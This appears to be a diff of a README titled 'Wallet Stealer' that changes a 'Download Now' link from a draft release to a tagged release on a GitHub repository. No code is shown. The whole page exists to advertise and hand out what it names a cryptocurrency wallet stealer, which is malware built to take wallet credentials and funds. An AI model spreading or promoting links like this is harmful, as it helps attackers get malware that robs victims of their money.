@@ -1,5 +1,5 @@
 # Wallet Stealer
-[Download Now](https://github.com/Kashi787/Wallet-Stealer/releases/edit/untagged-ded62e4f537d25e814c8)
+[Download Now](https://github.com/Kashi787/Wallet-Stealer/releases/tag/1)
 
 
 
